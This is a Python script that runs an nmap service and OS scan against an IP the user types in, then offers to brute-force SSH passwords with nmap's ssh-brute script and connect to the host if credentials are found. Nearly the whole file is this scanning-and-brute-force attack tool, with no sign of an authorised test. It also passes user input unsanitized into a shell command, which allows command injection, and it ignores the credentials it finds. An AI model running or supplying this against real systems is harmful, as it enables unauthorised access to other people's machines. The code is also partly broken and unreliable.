import subprocess

def run_nmap(target_ip):
    print(f"Running Nmap scan on {target_ip}...")
    nmap_command = ["nmap", "-A", "-p1-100", "-sV", "-O", target_ip]
    nmap_result = subprocess.check_output(nmap_command, text=True)
    print(f"\nNmap results for {target_ip}:\n{nmap_result}")

    # Save results to a text file
    save_to_file(nmap_result, f"nmap_results_{target_ip}.txt")

def run_ssh_brute_force(target_ip, port):
    print(f"Running SSH brute-force on {target_ip}:{port}...")

    # Use the ssh-brute.nse script
    nmap_command = ["nmap", f"-p {port}", "--script", "ssh-brute.nse", target_ip]

    try:
        nmap_result = subprocess.check_output(nmap_command, text=True)
        print(f"\nNmap results for {target_ip}:{port}:\n{nmap_result}")

        # Check if valid credentials were found
        if "Valid" in nmap_result:
            print("Valid credentials found. Attempting to connect via SSH...")
            connect_ssh(target_ip, port)

        # Save results to a text file
        save_to_file(nmap_result, f"nmap_ssh_brute_results_{target_ip}_{port}.txt")
    except subprocess.CalledProcessError as e:
        print(f"Error running Nmap: {e}")

def connect_ssh(target_ip, port):
    # Attempt to connect to SSH using the found credentials
    ssh_command = f"ssh -oHostKeyAlgorithms=ssh-rsa -p {port} user@{target_ip}"  # Replace 'user' with the actual username
    try:
        subprocess.run(ssh_command, shell=True, check=True)
        print(f"Successfully connected to SSH on {target_ip}:{port}")
    except subprocess.CalledProcessError as e:
        print(f"Error connecting to SSH: {e}")

def save_to_file(data, filename):
    with open(filename, 'w') as file:
        file.write(data)
    print(f"Results saved to {filename}")

def main():
    target_ip = input("Enter the target IP address: ")
    nmap_result = run_nmap(target_ip)

    run_scripts_option = input("Do you want to run SSH brute-force scripts? (yes/no): ").lower()

    if run_scripts_option == "yes":
        port = input(f"Enter the target port (default is 22 for SSH): ") or "22"
        run_ssh_brute_force(target_ip, port)

if __name__ == "__main__":
    main()
